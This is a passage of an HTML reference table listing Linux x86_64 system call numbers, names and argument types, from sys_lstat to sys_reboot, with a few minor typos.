*statbuf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center">sys_lstat</td><td align="center">fconst char *filename</td><td align="center">struct stat *statbuf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center">sys_poll</td><td align="center">struct poll_fd *ufds</td><td align="center">unsigned int nfds</td><td align="center">long timeout_msecs</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">8</td><td align="center">sys_lseek</td><td align="center">unsigned int fd</td><td align="center">off_t offset</td><td align="center">unsigned int origin</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">9</td><td align="center">sys_mmap</td><td align="center">unsigned long addr</td><td align="center">unsigned long len</td><td align="center">unsigned long prot</td><td align="center">unsigned long flags</td><td align="center">unsigned long fd</td><td align="center">unsigned long off</td></tr><tr><td align="center">10</td><td align="center">sys_mprotect</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned long prot</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">11</td><td align="center">sys_munmap</td><td align="center">unsigned long addr</td><td align="center">size_t len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">12</td><td align="center">sys_brk</td><td align="center">unsigned long brk</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">13</td><td align="center">sys_rt_sigaction</td><td align="center">int sig</td><td align="center">const struct sigaction *act</td><td align="center">struct sigaction *oact</td><td align="center">size_t sigsetsize</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">14</td><td align="center">sys_rt_sigprocmask</td><td align="center">int how</td><td align="center">sigset_t *nset</td><td align="center">sigset_t *oset</td><td align="center">size_t sigsetsize</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">15</td><td align="center">sys_rt_sigreturn</td><td align="center">unsigned long __unused</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">16</td><td align="center">sys_ioctl</td><td align="center">unsigned int fd</td><td align="center">unsigned int cmd</td><td align="center">unsigned long arg</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">17</td><td align="center">sys_pread64</td><td align="center">unsigned long fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center">loff_t pos</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">18</td><td align="center">sys_pwrite64</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center">loff_t pos</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">19</td><td align="center">sys_readv</td><td align="center">unsigned long fd</td><td align="center">const struct iovec *vec</td><td align="center">unsigned long vlen</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">sys_writev</td><td align="center">unsigned long fd</td><td align="center">const struct iovec *vec</td><td align="center">unsigned long vlen</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">sys_access</td><td align="center">const char *filename</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">22</td><td align="center">sys_pipe</td><td align="center">int *filedes</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">23</td><td align="center">sys_select</td><td align="center">int n</td><td align="center">fd_set *inp</td><td align="center">fd_set *outp</td><td align="center">fd_set*exp</td><td align="center">struct timeval *tvp</td><td align="center"></td></tr><tr><td align="center">24</td><td align="center">sys_sched_yield</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">25</td><td align="center">sys_mremap</td><td align="center">unsigned long addr</td><td align="center">unsigned long old_len</td><td align="center">unsigned long new_len</td><td align="center">unsigned long flags</td><td align="center">unsigned long new_addr</td><td align="center"></td></tr><tr><td align="center">26</td><td align="center">sys_msync</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">27</td><td align="center">sys_mincore</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned char *vec</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">28</td><td align="center">sys_madvise</td><td align="center">unsigned long start</td><td align="center">size_t len_in</td><td align="center">int behavior</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">29</td><td align="center">sys_shmget</td><td align="center">key_t key</td><td align="center">size_t size</td><td align="center">int shmflg</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">30</td><td align="center">sys_shmat</td><td align="center">int shmid</td><td align="center">char *shmaddr</td><td align="center">int shmflg</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">31</td><td align="center">sys_shmctl</td><td align="center">int shmid</td><td align="center">int cmd</td><td align="center">struct shmid_ds *buf</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">32</td><td align="center">sys_dup</td><td align="center">unsigned int fildes</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">33</td><td align="center">sys_dup2</td><td align="center">unsigned int oldfd</td><td align="center">unsigned int newfd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">34</td><td align="center">sys_pause</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">35</td><td align="center">sys_nanosleep</td><td align="center">struct timespec *rqtp</td><td align="center">struct timespec *rmtp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">36</td><td align="center">sys_getitimer</td><td align="center">int which</td><td align="center">struct itimerval *value</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">37</td><td align="center">sys_alarm</td><td align="center">unsigned int seconds</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">38</td><td align="center">sys_setitimer</td><td align="center">int which</td><td align="center">struct itimerval *value</td><td align="center">struct itimerval *ovalue</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">39</td><td align="center">sys_getpid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">40</td><td align="center">sys_sendfile</td><td align="center">int out_fd</td><td align="center">int in_fd</td><td align="center">off_t *offset</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">41</td><td align="center">sys_socket</td><td align="center">int family</td><td align="center">int type</td><td align="center">int protocol</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">42</td><td align="center">sys_connect</td><td align="center">int fd</td><td align="center">struct sockaddr *uservaddr</td><td align="center">int addrlen</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">43</td><td align="center">sys_accept</td><td align="center">int fd</td><td align="center">struct sockaddr *upeer_sockaddr</td><td align="center">int *upeer_addrlen</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">44</td><td align="center">sys_sendto</td><td align="center">int fd</td><td align="center">void *buff</td><td align="center">size_t len</td><td align="center">unsigned flags</td><td align="center">struct sockaddr *addr</td><td align="center">int addr_len</td></tr><tr><td align="center">45</td><td align="center">sys_recvfrom</td><td align="center">int fd</td><td align="center">void *ubuf</td><td align="center">size_t size</td><td align="center">unsigned flags</td><td align="center">struct sockaddr *addr</td><td align="center">int *addr_len</td></tr><tr><td align="center">46</td><td align="center">sys_sendmsg</td><td align="center">int fd</td><td align="center">struct msghdr *msg</td><td align="center">unsigned flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">47</td><td align="center">sys_recvmsg</td><td align="center">int fd</td><td align="center">struct msghdr *msg</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">48</td><td align="center">sys_shutdown</td><td align="center">int fd</td><td align="center">int how</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">49</td><td align="center">sys_bind</td><td align="center">int fd</td><td align="center">struct sokaddr *umyaddr</td><td align="center">int addrlen</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">50</td><td align="center">sys_listen</td><td align="center">int fd</td><td align="center">int backlog</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">51</td><td align="center">sys_getsockname</td><td align="center">int fd</td><td align="center">struct sockaddr *usockaddr</td><td align="center">int *usockaddr_len</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">52</td><td align="center">sys_getpeername</td><td align="center">int fd</td><td align="center">struct sockaddr *usockaddr</td><td align="center">int *usockaddr_len</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">53</td><td align="center">sys_socketpair</td><td align="center">int family</td><td align="center">int type</td><td align="center">int protocol</td><td align="center">int *usockvec</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">54</td><td align="center">sys_setsockopt</td><td align="center">int fd</td><td align="center">int level</td><td align="center">int optname</td><td align="center">char *optval</td><td align="center">int optlen</td><td align="center"></td></tr><tr><td align="center">55</td><td align="center">sys_getsockopt</td><td align="center">int fd</td><td align="center">int level</td><td align="center">int optname</td><td align="center">char *optval</td><td align="center">int *optlen</td><td align="center"></td></tr><tr><td align="center">56</td><td align="center">sys_clone</td><td align="center">unsigned long clone_flags</td><td align="center">unsigned long newsp</td><td align="center">void *parent_tid</td><td align="center">void *child_tid</td><td align="center">unsigned int tid</td><td align="center"></td></tr><tr><td align="center">57</td><td align="center">sys_fork</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">58</td><td align="center">sys_vfork</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">59</td><td align="center">sys_execve</td><td align="center">const char *filename</td><td align="center">const char *const argv[]</td><td align="center">const char *const envp[]</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">60</td><td align="center">sys_exit</td><td align="center">int error_code</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">61</td><td align="center">sys_wait4</td><td align="center">pid_t upid</td><td align="center">int *stat_addr</td><td align="center">int options</td><td align="center">struct rusage *ru</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">62</td><td align="center">sys_kill</td><td align="center">pid_t pid</td><td align="center">int sig</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">63</td><td align="center">sys_uname</td><td align="center">struct old_utsname *name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">64</td><td align="center">sys_semget</td><td align="center">key_t key</td><td align="center">int nsems</td><td align="center">int semflg</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">65</td><td align="center">sys_semop</td><td align="center">int semid</td><td align="center">struct sembuf *tsops</td><td align="center">unsigned nsops</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">66</td><td align="center">sys_semctl</td><td align="center">int semid</td><td align="center">int semnum</td><td align="center">int cmd</td><td align="center">union semun arg</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">67</td><td align="center">sys_shmdt</td><td align="center">char *shmaddr</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">68</td><td align="center">sys_msgget</td><td align="center">key_t key</td><td align="center">int msgflg</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">69</td><td align="center">sys_msgsnd</td><td align="center">int msqid</td><td align="center">struct msgbuf *msgp</td><td align="center">size_t msgsz</td><td align="center">int msgflg</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">70</td><td align="center">sys_msgrcv</td><td align="center">int msqid</td><td align="center">struct msgbuf *msgp</td><td align="center">size_t msgsz</td><td align="center">long msgtyp</td><td align="center">int msgflg</td><td align="center"></td></tr><tr><td align="center">71</td><td align="center">sys_msgctl</td><td align="center">int msqid</td><td align="center">int cmd</td><td align="center">struct msqid_ds *buf</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">72</td><td align="center">sys_fcntl</td><td align="center">unsigned int fd</td><td align="center">unsigned int cmd</td><td align="center">unsigned long arg</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">73</td><td align="center">sys_flock</td><td align="center">unsigned int fd</td><td align="center">unsigned int cmd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">74</td><td align="center">sys_fsync</td><td align="center">unsigned int fd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">75</td><td align="center">sys_fdatasync</td><td align="center">unsigned int fd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">76</td><td align="center">sys_truncate</td><td align="center">const char *path</td><td align="center">long length</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">77</td><td align="center">sys_ftruncate</td><td align="center">unsigned int fd</td><td align="center">unsigned long length</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">78</td><td align="center">sys_getdents</td><td align="center">unsigned int fd</td><td align="center">struct linux_dirent *dirent</td><td align="center">unsigned int count</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">79</td><td align="center">sys_getcwd</td><td align="center">char *buf</td><td align="center">unsigned long size</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">80</td><td align="center">sys_chdir</td><td align="center">const char *filename</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">81</td><td align="center">sys_fchdir</td><td align="center">unsigned int fd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">82</td><td align="center">sys_rename</td><td align="center">const char *oldname</td><td align="center">const char *newname</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">83</td><td align="center">sys_mkdir</td><td align="center">const char *pathname</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">84</td><td align="center">sys_rmdir</td><td align="center">const char *pathname</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">85</td><td align="center">sys_creat</td><td align="center">const char *pathname</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">86</td><td align="center">sys_link</td><td align="center">const char *oldname</td><td align="center">const char *newname</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">87</td><td align="center">sys_unlink</td><td align="center">const char *pathname</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">88</td><td align="center">sys_symlink</td><td align="center">const char *oldname</td><td align="center">const char *newname</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">89</td><td align="center">sys_readlink</td><td align="center">const char *path</td><td align="center">char *buf</td><td align="center">int bufsiz</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">90</td><td align="center">sys_chmod</td><td align="center">const char *filename</td><td align="center">mode_t mode</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">91</td><td align="center">sys_fchmod</td><td align="center">unsigned int fd</td><td align="center">mode_t mode</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">92</td><td align="center">sys_chown</td><td align="center">const char *filename</td><td align="center">uid_t user</td><td align="center">gid_t group</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">93</td><td align="center">sys_fchown</td><td align="center">unsigned int fd</td><td align="center">uid_t user</td><td align="center">gid_t group</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">94</td><td align="center">sys_lchown</td><td align="center">const char *filename</td><td align="center">uid_t user</td><td align="center">gid_t group</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">95</td><td align="center">sys_umask</td><td align="center">int mask</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">96</td><td align="center">sys_gettimeofday</td><td align="center">struct timeval *tv</td><td align="center">struct timezone *tz</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">97</td><td align="center">sys_getrlimit</td><td align="center">unsigned int resource</td><td align="center">struct rlimit *rlim</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">98</td><td align="center">sys_getrusage</td><td align="center">int who</td><td align="center">struct rusage *ru</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">99</td><td align="center">sys_sysinfo</td><td align="center">struct sysinfo *info</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">100</td><td align="center">sys_times</td><td align="center">struct tms *tbuf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">101</td><td align="center">sys_ptrace</td><td align="center">long request</td><td align="center">long pid</td><td align="center">unsigned long addr</td><td align="center">unsigned long data</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">102</td><td align="center">sys_getuid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">103</td><td align="center">sys_syslog</td><td align="center">int type</td><td align="center">char *buf</td><td align="center">int len</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">104</td><td align="center">sys_getgid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">105</td><td align="center">sys_setuid</td><td align="center">uid_t uid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">106</td><td align="center">sys_setgid</td><td align="center">gid_t gid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">107</td><td align="center">sys_geteuid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">108</td><td align="center">sys_getegid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">109</td><td align="center">sys_setpgid</td><td align="center">pid_t pid</td><td align="center">pid_t pgid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">110</td><td align="center">sys_getppid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">111</td><td align="center">sys_getpgrp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">112</td><td align="center">sys_setsid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">113</td><td align="center">sys_setreuid</td><td align="center">uid_t ruid</td><td align="center">uid_t euid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">114</td><td align="center">sys_setregid</td><td align="center">gid_t rgid</td><td align="center">gid_t egid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">115</td><td align="center">sys_getgroups</td><td align="center">int gidsetsize</td><td align="center">gid_t *grouplist</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">116</td><td align="center">sys_setgroups</td><td align="center">int gidsetsize</td><td align="center">gid_t *grouplist</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">117</td><td align="center">sys_setresuid</td><td align="center">uid_t *ruid</td><td align="center">uid_t *euid</td><td align="center">uid_t *suid</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">118</td><td align="center">sys_getresuid</td><td align="center">uid_t *ruid</td><td align="center">uid_t *euid</td><td align="center">uid_t *suid</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">119</td><td align="center">sys_setresgid</td><td align="center">gid_t rgid</td><td align="center">gid_t egid</td><td align="center">gid_t sgid</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">120</td><td align="center">sys_getresgid</td><td align="center">gid_t *rgid</td><td align="center">gid_t *egid</td><td align="center">gid_t *sgid</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">121</td><td align="center">sys_getpgid</td><td align="center">pid_t pid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">122</td><td align="center">sys_setfsuid</td><td align="center">uid_t uid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">123</td><td align="center">sys_setfsgid</td><td align="center">gid_t gid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">124</td><td align="center">sys_getsid</td><td align="center">pid_t pid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">125</td><td align="center">sys_capget</td><td align="center">cap_user_header_t header</td><td align="center">cap_user_data_t dataptr</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">126</td><td align="center">sys_capset</td><td align="center">cap_user_header_t header</td><td align="center">const cap_user_data_t data</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">127</td><td align="center">sys_rt_sigpending</td><td align="center">sigset_t *set</td><td align="center">size_t sigsetsize</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">128</td><td align="center">sys_rt_sigtimedwait</td><td align="center">const sigset_t *uthese</td><td align="center">siginfo_t *uinfo</td><td align="center">const struct timespec *uts</td><td align="center">size_t sigsetsize</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">129</td><td align="center">sys_rt_sigqueueinfo</td><td align="center">pid_t pid</td><td align="center">int sig</td><td align="center">siginfo_t *uinfo</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">130</td><td align="center">sys_rt_sigsuspend</td><td align="center">sigset_t *unewset</td><td align="center">size_t sigsetsize</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">131</td><td align="center">sys_sigaltstack</td><td align="center">const stack_t *uss</td><td align="center">stack_t *uoss</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">132</td><td align="center">sys_utime</td><td align="center">char *filename</td><td align="center">struct utimbuf *times</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">133</td><td align="center">sys_mknod</td><td align="center">const char *filename</td><td align="center">umode_t mode</td><td align="center">unsigned dev</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">134</td><td align="center">sys_uselib</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">135</td><td align="center">sys_personality</td><td align="center">unsigned int personality</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">136</td><td align="center">sys_ustat</td><td align="center">unsigned dev</td><td align="center">struct ustat *ubuf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">137</td><td align="center">sys_statfs</td><td align="center">const char *pathname</td><td align="center">struct statfs *buf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">138</td><td align="center">sys_fstatfs</td><td align="center">unsigned int fd</td><td align="center">struct statfs *buf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">139</td><td align="center">sys_sysfs</td><td align="center">int option</td><td align="center">unsigned long arg1</td><td align="center">unsigned long arg2</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">140</td><td align="center">sys_getpriority</td><td align="center">int which</td><td align="center">int who</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">141</td><td align="center">sys_setpriority</td><td align="center">int which</td><td align="center">int who</td><td align="center">int niceval</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">142</td><td align="center">sys_sched_setparam</td><td align="center">pid_t pid</td><td align="center">struct sched_param *param</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">143</td><td align="center">sys_sched_getparam</td><td align="center">pid_t pid</td><td align="center">struct sched_param *param</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">144</td><td align="center">sys_sched_setscheduler</td><td align="center">pid_t pid</td><td align="center">int policy</td><td align="center">struct sched_param *param</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">145</td><td align="center">sys_sched_getscheduler</td><td align="center">pid_t pid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">146</td><td align="center">sys_sched_get_priority_max</td><td align="center">int policy</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">147</td><td align="center">sys_sched_get_priority_min</td><td align="center">int policy</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">148</td><td align="center">sys_sched_rr_get_interval</td><td align="center">pid_t pid</td><td align="center">struct timespec *interval</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">149</td><td align="center">sys_mlock</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">150</td><td align="center">sys_munlock</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">151</td><td align="center">sys_mlockall</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">152</td><td align="center">sys_munlockall</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">153</td><td align="center">sys_vhangup</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">154</td><td align="center">sys_modify_ldt</td><td align="center">int func</td><td align="center">void *ptr</td><td align="center">unsigned long bytecount</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">155</td><td align="center">sys_pivot_root</td><td align="center">const char *new_root</td><td align="center">const char *put_old</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">156</td><td align="center">sys__sysctl</td><td align="center">struct __sysctl_args *args</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">157</td><td align="center">sys_prctl</td><td align="center">int option</td><td align="center">unsigned long arg2</td><td align="center">unsigned long arg3</td><td align="center">unsigned long arg4</td><td align="center"></td><td align="center">unsigned long arg5</td></tr><tr><td align="center">158</td><td align="center">sys_arch_prctl</td><td align="center">struct task_struct *task</td><td align="center">int code</td><td align="center">unsigned long *addr</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">159</td><td align="center">sys_adjtimex</td><td align="center">struct timex *txc_p</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">160</td><td align="center">sys_setrlimit</td><td align="center">unsigned int resource</td><td align="center">struct rlimit *rlim</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">161</td><td align="center">sys_chroot</td><td align="center">const char *filename</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">162</td><td align="center">sys_sync</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">163</td><td align="center">sys_acct</td><td align="center">const char *name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">164</td><td align="center">sys_settimeofday</td><td align="center">struct timeval *tv</td><td align="center">struct timezone *tz</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">165</td><td align="center">sys_mount</td><td align="center">char *dev_name</td><td align="center">char *dir_name</td><td align="center">char *type</td><td align="center">unsigned long flags</td><td align="center">void *data</td><td align="center"></td></tr><tr><td align="center">166</td><td align="center">sys_umount2</td><td align="center">const char *target</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">167</td><td align="center">sys_swapon</td><td align="center">const char *specialfile</td><td align="center">int swap_flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">168</td><td align="center">sys_swapoff</td><td align="center">const char *specialfile</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">169</td><td align="center">sys_reboot</td><td 